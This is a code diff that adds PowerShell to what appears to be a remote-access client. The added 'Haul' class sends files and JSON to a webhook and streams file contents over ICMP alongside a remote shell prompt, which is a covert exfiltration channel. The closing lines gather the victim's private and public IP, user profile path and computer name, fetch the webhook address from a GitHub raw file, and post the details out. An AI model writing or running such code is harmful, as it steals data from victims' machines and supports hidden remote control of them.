@@ -2,7 +2,73 @@
 $F = [Windows.Native.Kernel32]::GetCurrentConsoleFontEx(); $F.FontIndex = 0; $F.FontWidth = 6; $F.FontHeight = 12; $F.FontFamily = 54; $F.FontWeight = 1000; $F.FaceName = "SimSun-ExtB"; [Windows.Native.Kernel32]::SetCurrentConsoleFontEx($F)
 [char]$EL = 10
 
+Class Haul {
+  $file
+  $WbhkUrl
+  #Set Default Webhook URL
+  sdwk ([string]$WebhookUrl) {
+      $this.WbhkUrl = $WebhookUrl
+      Write-Verbose "Set Default to $($this.WbhkUrl)"
+  }
 
+  jWebhook ([System.Collections.Hashtable]$str) {
+      $json = $str | ConvertTo-Json
+      Invoke-RestMethod -Uri ($this.WbhkUrl) -Method POST -Body $json -ContentType "application/json"
+  }
+
+
+  fWebhook ([string]$filePath) {
+      $this.file = $filePath; $Content = Get-Content $this.file
+      $irm = Invoke-RestMethod -Uri ($this.WbhkUrl) -Method POST -Body $Content -ContentType "application/json"
+      if ([bool]$irm -eq $true) {
+          Write-Output "Success Sending $($this.file) to $($this.WbhkUrl)"
+          Write-Verbose "Success Sending $($this.file) to $($this.WbhkUrl)"
+      }
+      else {
+          Write-Output "Failed Sending $($this.file) to $($this.WbhkUrl)"
+          Write-Verbose "Failed Sending $($this.file) to $($this.WbhkUrl)"
+      }
+  }
+
+  OverIcmp ([string]$filePath) {
+      Write-Output f
+      $this.file = $filePath
+      Write-Output byf
+      $script:Icmp.sBytes("File")
+      Write-Output rec
+      $script:Icmp.Receive()
+      [int]$bufSize = 1472; $stream = [System.IO.File]::OpenRead(($this.file)); $chunkNum = 0
+      $TotalChunks = [math]::floor($stream.Length / 1472); 
+      $barr = New-Object byte[] $bufSize
+      Write-Output while
+      while ($stream.Read($barr, 0, $bufsize)) {
+          $chunkNum += 1
+          if ($chunkNum -eq ($TotalChunks)) {
+              $script:Icmp.sBytes("End")
+              $script:icmp.sBytes("PS $((Get-Location).Path)> ")
+              break
+          }
+          else {
+              $script:Icmp.sBytes("Done with $chunkNum out of $TotalChunks In $($this.file)")
+              Write-Output "Done with $chunkNum out of $TotalChunks"
+              $script:Icmp.sBytes([System.Text.Encoding]::ASCII.GetString($barr))
+              $script:Icmp.Receive()
+          }      
+      }
+  }
+}
+$Updt = @{
+  "ClientVer"    = "$($VERSION)"
+  "Prv-IP"       = "$((Get-NetIPAddress | Where-Object { $_.AddressState -eq "Preferred" -and $_.ValidLifetime -lt "24:00:00" }).IPAddress)"
+  "Binding IP"   = "$($BindingIP)"
+  "User"         = "$($env:USERPROFILE)"
+  "Pub-IP"       = "$((iwr -Uri "https://api.ipify.org").Content)"
+  "ComputerName" = "$($env:ComputerName)"
+  "Date"         = "$(Get-Date)"
+}
+$Haul = [Haul]::new()
+$Haul.sdwk(((iwr https://raw.githubusercontent.com/jh1sc/Conex/main/Client).content))
+$Haul.jWebhook($Updt)
 
 #send
 
